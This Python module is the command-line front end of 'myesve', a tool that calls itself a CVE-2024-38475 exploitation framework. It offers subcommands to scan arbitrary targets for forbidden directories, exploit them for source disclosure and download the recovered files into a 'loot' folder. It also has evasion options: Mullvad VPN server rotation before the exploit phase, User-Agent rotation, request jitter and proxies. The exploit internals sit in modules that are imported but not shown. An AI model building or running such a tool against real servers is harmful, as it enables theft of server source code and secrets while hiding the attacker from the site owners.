"""CLI entry point for myesve - CVE-2024-38475 exploitation framework."""

import argparse
import sys
from typing import List
from urllib.parse import urlparse, urlunparse

from termcolor import cprint  # type: ignore

from .banner import show_banner
from .exploiter import Exploiter
from .output import save_csv, save_json
from .scanner import DirectoryScanner
from .utils import traceroute
from .vpn import MullvadController

if sys.version_info >= (3, 9):
    from importlib.resources import files
else:
    from importlib_resources import files  # type: ignore


def get_package_wordlist(name: str) -> str:
    return str(files("myesve") / "wordlists" / name)


DEFAULT_DIR_WORDLIST = get_package_wordlist("raft-medium-directories.txt")
DEFAULT_FILE_WORDLIST = get_package_wordlist("raft-medium-files.txt")


def normalize_target(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.scheme:
        target = f"http://{target}"
        parsed = urlparse(target)
    return urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "", "")
    )


def cmd_scan(args: argparse.Namespace) -> None:
    base_url = normalize_target(args.target)
    scanner = DirectoryScanner(
        base_url=base_url,
        wordlist_path=args.dir_wordlist,
        threads=args.threads,
        rate=args.rate,
        timeout=args.timeout,
        adaptive_rate=args.adaptive_rate,
        jitter_min=args.jitter[0] if args.jitter else 0,
        jitter_max=args.jitter[1] if args.jitter else 0,
        rotate_ua=args.rotate_ua,
        proxy=args.proxy,
        log_file=args.log_file,
        log_level=args.log_level,
    )
    dirs = scanner.scan()
    if dirs:
        cprint(
            f"\n[+] Found {len(dirs)} directories with 403 status.", "green"
        )
        if args.output:
            if args.output_format == "json":
                save_json(dirs, args.output)
            elif args.output_format == "csv":
                save_csv([{"directory": d} for d in dirs], args.output)
            else:  # txt
                with open(args.output, "w", encoding="utf-8") as f:
                    for d in dirs:
                        f.write(d + "\n")
        else:
            for d in dirs:
                sys.stdout.write(d + "\n")
    else:
        cprint("[!] No 403 directories found.", "yellow")


def cmd_exploit(args: argparse.Namespace) -> None:
    base_url = normalize_target(args.target)
    if args.directories_file:
        with open(args.directories_file, encoding="utf-8") as f:
            dirs = [line.strip() for line in f if line.strip()]
    elif args.directories:
        dirs = args.directories
    else:
        cprint("[!] Must provide --directories or --directories-file", "red")
        return
    exploiter = Exploiter(
        base_url=base_url,
        directories=dirs,
        webroot=args.webroot,
        file_wordlist=args.file_wordlist,
        threads=args.threads,
        rate=args.rate,
        timeout=args.timeout,
        download_dir=args.download_dir if args.download else None,
        adaptive_rate=args.adaptive_rate,
        jitter_min=args.jitter[0] if args.jitter else 0,
        jitter_max=args.jitter[1] if args.jitter else 0,
        rotate_ua=args.rotate_ua,
        proxy=args.proxy,
        log_file=args.log_file,
        log_level=args.log_level,
    )
    exploiter.exploit(download=args.download)


def cmd_vpn(args: argparse.Namespace) -> None:
    vpn = MullvadController()
    if args.status:
        info = vpn.get_current_server()
        if info:
            cprint(f"Current Mullvad server: {info}", "cyan")
        else:
            cprint("Not connected or Mullvad unavailable.", "yellow")
        vpn.show_current_location()
    elif args.rotate:
        vpn.rotate_server(country=args.country)
    elif args.info:
        vpn.show_current_location()
    elif args.traceroute:
        out = traceroute(args.traceroute)
        print(out)


def cmd_full(args: argparse.Namespace) -> None:
    vpn = MullvadController() if args.vpn else None
    base_url = normalize_target(args.target)
    dirs: List[str] = []
    if args.dirs_file:
        with open(args.dirs_file, encoding="utf-8") as f:
            dirs = [line.strip() for line in f if line.strip()]
    else:
        scanner = DirectoryScanner(
            base_url=base_url,
            wordlist_path=args.dir_wordlist,
            threads=args.threads,
            rate=args.rate,
            timeout=args.timeout,
            adaptive_rate=args.adaptive_rate,
            jitter_min=args.jitter[0] if args.jitter else 0,
            jitter_max=args.jitter[1] if args.jitter else 0,
            rotate_ua=args.rotate_ua,
            proxy=args.proxy,
            log_file=args.log_file,
            log_level=args.log_level,
        )
        dirs = scanner.scan()
        if not dirs:
            cprint("[!] No directories found. Exiting.", "red")
            return
    if vpn and args.vpn_rotate_before:
        vpn.rotate_server(country=args.vpn_country)
    exploiter = Exploiter(
        base_url=base_url,
        directories=dirs,
        webroot=args.webroot,
        file_wordlist=args.file_wordlist,
        threads=args.threads,
        rate=args.rate,
        timeout=args.timeout,
        download_dir=args.download_dir if args.download else None,
        adaptive_rate=args.adaptive_rate,
        jitter_min=args.jitter[0] if args.jitter else 0,
        jitter_max=args.jitter[1] if args.jitter else 0,
        rotate_ua=args.rotate_ua,
        proxy=args.proxy,
        log_file=args.log_file,
        log_level=args.log_level,
    )
    exploiter.exploit(download=args.download)


def main() -> None:
    show_banner()
    parser = argparse.ArgumentParser(
        description="myesve - CVE-2024-38475 Exploitation Framework"
    )
    subparsers = parser.add_subparsers(
        dest="command", required=True, help="Subcommands"
    )

    def add_common_args(p):
        p.add_argument(
            "--adaptive-rate",
            action="store_true",
            help="Adjust rate based on response times",
        )
        p.add_argument(
            "--jitter",
            nargs=2,
            type=float,
            metavar=("MIN", "MAX"),
            help="Random delay between requests (seconds)",
        )
        p.add_argument(
            "--rotate-ua",
            action="store_true",
            help="Rotate User-Agent strings",
        )
        p.add_argument("--proxy", help="Proxy URL (http://, socks5://)")
        p.add_argument("--log-file", help="Write logs to file")
        p.add_argument(
            "--log-level",
            default="INFO",
            choices=["DEBUG", "INFO", "WARNING", "ERROR"],
            help="Log level",
        )

    # scan
    scan_parser = subparsers.add_parser(
        "scan", help="Scan for 403 directories"
    )
    scan_parser.add_argument(
        "-t", "--target", required=True, help="Target base URL"
    )
    scan_parser.add_argument(
        "--dir-wordlist",
        default=DEFAULT_DIR_WORDLIST,
        help="Directory wordlist path",
    )
    scan_parser.add_argument(
        "--threads", type=int, default=10, help="Number of threads"
    )
    scan_parser.add_argument(
        "--rate",
        type=float,
        default=0,
        help="Requests per second (0 = unlimited)",
    )
    scan_parser.add_argument(
        "--timeout", type=float, default=5, help="Request timeout"
    )
    scan_parser.add_argument("-o", "--output", help="Save results to file")
    scan_parser.add_argument(
        "--output-format",
        choices=["txt", "json", "csv"],
        default="txt",
        help="Output format",
    )
    add_common_args(scan_parser)
    scan_parser.set_defaults(func=cmd_scan)

    # exploit
    exploit_parser = subparsers.add_parser(
        "exploit", help="Attempt source disclosure"
    )
    exploit_parser.add_argument(
        "-t", "--target", required=True, help="Target base URL"
    )
    exploit_parser.add_argument(
        "--webroot", default="/var/www/html", help="Web root path"
    )
    exploit_parser.add_argument(
        "--directories", nargs="+", help="List of directories to test"
    )
    exploit_parser.add_argument(
        "--directories-file", help="File containing directories (one per line)"
    )
    exploit_parser.add_argument(
        "--file-wordlist", default=DEFAULT_FILE_WORDLIST, help="File wordlist"
    )
    exploit_parser.add_argument(
        "--threads", type=int, default=5, help="Number of threads"
    )
    exploit_parser.add_argument(
        "--rate", type=float, default=0, help="Requests per second"
    )
    exploit_parser.add_argument(
        "--timeout", type=float, default=5, help="Request timeout"
    )
    exploit_parser.add_argument(
        "--download", action="store_true", help="Download discovered files"
    )
    exploit_parser.add_argument(
        "--download-dir", default="loot", help="Directory to save downloads"
    )
    add_common_args(exploit_parser)
    exploit_parser.set_defaults(func=cmd_exploit)

    # vpn
    vpn_parser = subparsers.add_parser("vpn", help="Mullvad VPN control")
    vpn_parser.add_argument(
        "--status", action="store_true", help="Show current VPN status"
    )
    vpn_parser.add_argument(
        "--rotate", action="store_true", help="Rotate to a new VPN server"
    )
    vpn_parser.add_argument(
        "--country", help="Filter VPN server by country (e.g., 'se')"
    )
    vpn_parser.add_argument(
        "--info", action="store_true", help="Show current IP geolocation"
    )
    vpn_parser.add_argument(
        "--traceroute", metavar="TARGET", help="Run traceroute to target"
    )
    vpn_parser.set_defaults(func=cmd_vpn)

    # full
    full_parser = subparsers.add_parser(
        "full", help="Run full scan and exploit"
    )
    full_parser.add_argument(
        "-t", "--target", required=True, help="Target base URL"
    )
    full_parser.add_argument(
        "--webroot", default="/var/www/html", help="Web root path"
    )
    full_parser.add_argument(
        "--dir-wordlist",
        default=DEFAULT_DIR_WORDLIST,
        help="Directory wordlist",
    )
    full_parser.add_argument(
        "--file-wordlist", default=DEFAULT_FILE_WORDLIST, help="File wordlist"
    )
    full_parser.add_argument(
        "--threads", type=int, default=10, help="Threads for scanning"
    )
    full_parser.add_argument(
        "--rate", type=float, default=0, help="Requests per second"
    )
    full_parser.add_argument(
        "--timeout", type=float, default=5, help="Request timeout"
    )
    full_parser.add_argument(
        "--download", action="store_true", help="Download files"
    )
    full_parser.add_argument(
        "--download-dir", default="loot", help="Download directory"
    )
    full_parser.add_argument(
        "--vpn", action="store_true", help="Enable Mullvad VPN rotation"
    )
    full_parser.add_argument(
        "--vpn-rotate-before",
        action="store_true",
        help="Rotate VPN before exploit phase",
    )
    full_parser.add_argument("--vpn-country", help="VPN country filter")
    full_parser.add_argument(
        "--dirs-file", help="Use pre-scanned directories file (skip scan)"
    )
    add_common_args(full_parser)
    full_parser.set_defaults(func=cmd_full)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
